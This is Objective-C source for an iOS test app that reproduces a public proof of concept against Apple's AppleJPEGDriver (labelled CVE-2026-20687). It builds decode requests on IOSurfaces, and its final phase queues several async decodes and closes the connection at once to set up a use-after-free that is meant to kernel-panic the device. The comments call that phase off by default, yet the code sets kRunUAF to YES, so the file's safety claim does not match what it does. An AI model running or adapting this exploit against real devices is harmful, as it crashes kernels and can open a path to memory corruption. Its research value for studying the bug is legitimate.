//
//  jpeg_poc4.m — AppleJPEGDriver 完整解码复现（按公开 PoC 的 Phase 2/4）
//
//  前置结论（jpegprobe3 实测得出）：
//    · checkStructureInputSize == 0x58（只有 in=0x58 能过校验）
//    · kIOReturnNotAttached(0xe00002c2) 的真实含义 = 「结构体尺寸不匹配」
//    · 全零 0x58 结构体调 sel 1(decode)/sel 3(encode) → 0x2cc（已进入真正处理路径）
//
//  本包要做的：
//    Phase 1  创建真实 IOSurface（源=JPEG 数据，目标=BGRA 像素）
//    Phase 2  同步 decode（sel 1，asyncToken=0）—— 目标：拿到 SUCCESS
//    Phase 3  异步 decode（sel 1，asyncToken≠0，不关连接）—— 目标：拿到 SUCCESS
//    Phase 4  （可选，默认关闭）连发 async + 立刻关连接 → 制造 PoC 的 UAF
//
//  安全设计：
//    Phase 4 默认不执行。只有把 runUAF 设为 YES 才会跑 —— 那一步可能直接 kernel panic
//    （PoC 原文：intentionally kernel-panics an affected physical device）。
//    前三阶段只提交请求，不关连接、不 spray，不会造成 UAF。
//
//  注意：theos SDK 的 IOSurface.framework 只有 .tbd，头文件需手动声明。
//        链接仍走 -framework IOSurface。
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>

// ---- IOSurface 公开 API（手动声明）----
typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID csid);
extern IOSurfaceID  IOSurfaceGetID(IOSurfaceRef buffer);
extern void        *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t       IOSurfaceGetAllocSize(IOSurfaceRef buffer);
extern size_t       IOSurfaceGetWidth(IOSurfaceRef buffer);
extern size_t       IOSurfaceGetHeight(IOSurfaceRef buffer);
extern size_t       IOSurfaceGetBytesPerRow(IOSurfaceRef buffer);
extern kern_return_t IOSurfaceLock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);

// kIOSurface* 属性键
static NSString *const kISWidth      = @"IOSurfaceWidth";
static NSString *const kISHeight     = @"IOSurfaceHeight";
static NSString *const kISBPE        = @"IOSurfaceBytesPerElement";
static NSString *const kISPF         = @"IOSurfacePixelFormat";
static NSString *const kISAllocSize  = @"IOSurfaceAllocSize";

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static dispatch_queue_t gQ = nil;

// ★ 安全开关：改成 YES 才会执行 Stage 4（制造 stale 状态；不主动 panic）
//   注意：Stage 4 只负责「发 async + 立刻关连接」，不打开相机。
//   真正的 panic 需要你事后手动打开相机 App 才会触发。
static const BOOL kRunUAF = YES;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 1:          return "KERN_INVALID_ADDRESS";
        case 2:          return "KERN_PROTECTION_FAILURE";
        case 4:          return "KERN_INVALID_ARGUMENT";
        case 5:          return "KERN_FAILURE";
        case 0x2cc:      return "AVE_JPEG_ERR_0x2cc";
        case 0xe00002bc: return "Error";
        case 0xe00002c1: return "NotReady";
        case 0xe00002c2: return "NotAttached";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "BadArgument";
        case 0xe00002cd: return "ExclusiveAccess";
        case 0xe00002d5: return "Busy";
        case 0xe00002d6: return "Timeout";
        case 0xe00002e2: return "NotPermitted";
        case 0xe00002e3: return "NotPrivileged";
        case 0xe00002eb: return "InsufficientMemory";
        case 0xe00002f0: return "NotFound";
        default:         return "?";
    }
}

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"JPEGP4 %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jpegp4.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_async(gQ, ^{
        [gLog appendString:line];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
        });
    });
}

// 公开 PoC 的 0x58 结构体
typedef struct __attribute__((packed)) {
    uint32_t sourceID;
    uint32_t field_04;
    uint32_t destID;
    uint32_t field_0C;
    uint32_t field_10;
    uint32_t width;
    uint32_t height;
    uint32_t field_1C;
    uint8_t  flags;
    uint8_t  pad_21[3];
    uint32_t xOffset;
    uint32_t yOffset;
    uint32_t subsampling;
    uint64_t asyncToken;
    uint64_t asyncToken2;
    uint64_t field_40;
    uint32_t codecID;
    uint32_t outWidth;
    uint32_t outHeight;
    uint32_t field_54;
} jpeg_req_t;
_Static_assert(sizeof(jpeg_req_t) == 0x58, "must be 0x58");

#pragma mark - helpers

static IOSurfaceRef makeSourceSurface(NSData *jpeg)
{
    size_t len = jpeg.length;
    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{
        kISWidth:      @(allocLen),
        kISHeight:     @1,
        kISBPE:        @1,
        kISPF:         @0x20202020,   // '    ' 原始字节
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) return NULL;
    IOSurfaceLock(s, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(s);
    if (base) memcpy(base, jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(s, 0, NULL);
    return s;
}

static IOSurfaceRef makeDestSurface(uint32_t w, uint32_t h)
{
    NSDictionary *props = @{
        kISWidth:  @(w),
        kISHeight: @(h),
        kISBPE:    @4,
        kISPF:     @0x42475241,   // 'BGRA'
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

static NSData *makeJPEG(uint32_t w, uint32_t h)
{
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

// 一次 decode 调用，返回 kr，并把 output 打出来
static kern_return_t call_decode(io_connect_t conn, uint32_t sel,
                                 uint32_t srcID, uint32_t dstID,
                                 uint32_t w, uint32_t h,
                                 uint64_t token, uint32_t subsample,
                                 const char *tag)
{
    jpeg_req_t in; memset(&in, 0, sizeof(in));
    in.sourceID    = srcID;
    in.field_04    = w * h;
    in.destID      = dstID;
    in.field_0C    = w * h * 4;
    in.width       = w;
    in.height      = h;
    in.outWidth    = w;
    in.outHeight   = h;
    in.subsampling = subsample;
    in.asyncToken  = token;

    jpeg_req_t out; memset(&out, 0, sizeof(out));
    size_t os = sizeof(out);

    kern_return_t kr = IOConnectCallStructMethod(conn, sel, &in, sizeof(in), &out, &os);

    L(@"  [%s] sel=%u src=%u dst=%u %ux%u sub=%u token=0x%llx",
      tag, sel, srcID, dstID, w, h, subsample, (unsigned long long)token);
    L(@"        -> 0x%08x %s   outSize=0x%zx", (uint32_t)kr, kr_name(kr), os);
    if (kr == KERN_SUCCESS) {
        L(@"        out: src=%u dst=%u w=%u h=%u codec=%u outW=%u outH=%u",
          out.sourceID, out.destID, out.width, out.height,
          out.codecID, out.outWidth, out.outHeight);
    }
    return kr;
}

#pragma mark - stages

static void run(void)
{
    L(@"===== AppleJPEGDriver full decode reproduction =====");
    L(@"uid=%d euid=%d pid=%d", getuid(), geteuid(), getpid());
    L(@"kRunUAF = %@  （YES 会执行可能 panic 的 Stage 4）", kRunUAF ? @"YES" : @"NO");

    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
    L(@"[1] service = 0x%08x", svc);
    if (svc == MACH_PORT_NULL) return;

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    L(@"[2] open(type=0) 0x%08x %s conn=0x%08x", (uint32_t)kr, kr_name(kr), conn);
    if (kr != KERN_SUCCESS) { IOObjectRelease(svc); return; }

    // ---------- Phase 1: 创建 surfaces ----------
    L(@"");
    L(@"=== Phase 1: 创建 IOSurface ===");
    const uint32_t W = 64, H = 64;
    NSData *jpeg = makeJPEG(W, H);
    L(@"  JPEG data: %lu bytes", (unsigned long)jpeg.length);

    IOSurfaceRef src = makeSourceSurface(jpeg);
    IOSurfaceRef dst = makeDestSurface(W, H);
    L(@"  src surface = %p   dst surface = %p", src, dst);
    if (!src || !dst) {
        L(@"  surface 创建失败，终止");
        IOServiceClose(conn); IOObjectRelease(svc);
        if (src) CFRelease(src); if (dst) CFRelease(dst);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(src);
    uint32_t dstID = IOSurfaceGetID(dst);
    L(@"  srcID=%u (alloc=%zu)  dstID=%u (alloc=%zu)",
      srcID, IOSurfaceGetAllocSize(src), dstID, IOSurfaceGetAllocSize(dst));

    // ---------- Phase 2: 同步 decode ----------
    L(@"");
    L(@"=== Phase 2: 同步 decode（token=0）===");
    kern_return_t r1 = call_decode(conn, 1, srcID, dstID, W, H, 0, 0, "sync 444");
    kern_return_t r2 = call_decode(conn, 1, srcID, dstID, W, H, 0, 3, "sync 420");
    // 也试 encode（sel 3）：源=像素，目标=JPEG
    kern_return_t r3 = call_decode(conn, 3, dstID, srcID, W, H, 0, 3, "encode 420");

    BOOL anySync = (r1 == KERN_SUCCESS || r2 == KERN_SUCCESS || r3 == KERN_SUCCESS);
    L(@"  同步阶段结果: %@", anySync ? @"★ 至少一个成功" : @"全部失败");

    // ---------- Phase 3: 异步 decode（不关连接） ----------
    L(@"");
    L(@"=== Phase 3: 异步 decode（token≠0，连接保持）===");
    kern_return_t a1 = call_decode(conn, 1, srcID, dstID, W, H, 0x4141, 3, "async 420");
    kern_return_t a2 = call_decode(conn, 1, srcID, dstID, W, H, 0x4142, 3, "async 420 #2");
    BOOL anyAsync = (a1 == KERN_SUCCESS || a2 == KERN_SUCCESS);
    L(@"  异步阶段结果: %@", anyAsync ? @"★ 至少一个成功" : @"全部失败");

    // 等硬件完成，避免影响后续
    usleep(800 * 1000);

    // 确认驱动还活着
    jpeg_req_t probe; memset(&probe, 0, sizeof(probe));
    jpeg_req_t pout; memset(&pout, 0, sizeof(pout));
    size_t ps = sizeof(pout);
    kern_return_t alive = IOConnectCallStructMethod(conn, 1, &probe, sizeof(probe), &pout, &ps);
    L(@"");
    L(@"=== 驱动健康检查（全零请求应返回 0x2cc，不是 NotAttached）===");
    L(@"  -> 0x%08x %s", (uint32_t)alive, kr_name(alive));

    IOServiceClose(conn);

    // ---------- Phase 4（默认关闭）----------
    L(@"");
    if (!kRunUAF) {
        L(@"=== Phase 4: 跳过（kRunUAF = NO）===");
        L(@"  这一步会把 async 请求发出去后立刻 IOServiceClose，");
        L(@"  制造 CVE-2026-20687 的「请求已入队但连接已关」状态，");
        L(@"  后续 finish_io_gated 会遍历到已释放的 JpegRequest → 可能直接 panic。");
        L(@"  要跑就把源码里 kRunUAF 改成 YES 重新构建。");
    } else {
        L(@"=== Phase 4: 制造 stale 状态（不主动 panic）===");
        L(@"  配方：新连接 → 连发 async decode(token≠0) → 立刻 IOServiceClose");
        L(@"  本阶段不打开相机，所以不会主动崩溃。");
        L(@"  若一切正常，事后你手动打开相机，才会驱动同步解码并触发 panic。");

        // 用更大的 surface 给硬件足够工作量（PoC 用 2048x2048）
        const uint32_t BW = 2048, BH = 2048;
        NSData *bigJpeg = makeJPEG(BW, BH);
        IOSurfaceRef bsrc = makeSourceSurface(bigJpeg);
        IOSurfaceRef bdst = makeDestSurface(BW, BH);
        L(@"  大图 surface: src=%p dst=%p  jpeg=%lu bytes",
          bsrc, bdst, (unsigned long)bigJpeg.length);

        if (bsrc && bdst) {
            uint32_t bsrcID = IOSurfaceGetID(bsrc);
            uint32_t bdstID = IOSurfaceGetID(bdst);
            L(@"  bsrcID=%u bdstID=%u", bsrcID, bdstID);

            io_connect_t c2 = MACH_PORT_NULL;
            kern_return_t k2 = IOServiceOpen(svc, mach_task_self(), 0, &c2);
            L(@"  新连接 0x%08x %s conn=0x%08x", (uint32_t)k2, kr_name(k2), c2);
            if (k2 == KERN_SUCCESS) {
                const int N = 5;
                int submitted = 0;
                for (int j = 0; j < N; j++) {
                    kern_return_t r = call_decode(c2, 1, bsrcID, bdstID, BW, BH,
                                                  0x4141 + j, 3, "UAF submit");
                    if (r != KERN_SUCCESS) { L(@"  第 %d 个失败，停止（驱动可能已满）", j); break; }
                    submitted++;
                }
                L(@"  已提交 %d/%d 个 async 请求", submitted, N);

                // ★ 关键：立刻关闭，不等硬件完成
                IOServiceClose(c2);
                L(@"  ★ 连接已关闭（此时硬件可能仍在处理，stale 状态已建立）");
                L(@"");
                L(@"  >>> 现在请手动打开「相机」App <<<");
                L(@"     那会驱动一次同步 JPEG 解码 → 10 秒超时 →");
                L(@"     finish_io_gated 遍历到已释放的 JpegRequest → 可能 panic");
                L(@"");
                L(@"     如果没崩，说明：要么洞不在这个版本，要么 reclaim 抢先了。");
                L(@"     崩了的话，重启后我可以用 crash 日志取 panic 证据。");
            }
            CFRelease(bsrc); CFRelease(bdst);
        } else {
            L(@"  大图 surface 创建失败，跳过 Phase 4");
            if (bsrc) CFRelease(bsrc);
            if (bdst) CFRelease(bdst);
        }
    }

    if (src) CFRelease(src);
    if (dst) CFRelease(dst);
    IOObjectRelease(svc);
    L(@"");
    L(@"===== done =====");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("jpegp4.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    gView = [[UITextView alloc] initWithFrame:self.window.bounds];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    gView.text = @"JPEG full decode starting...\n";
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
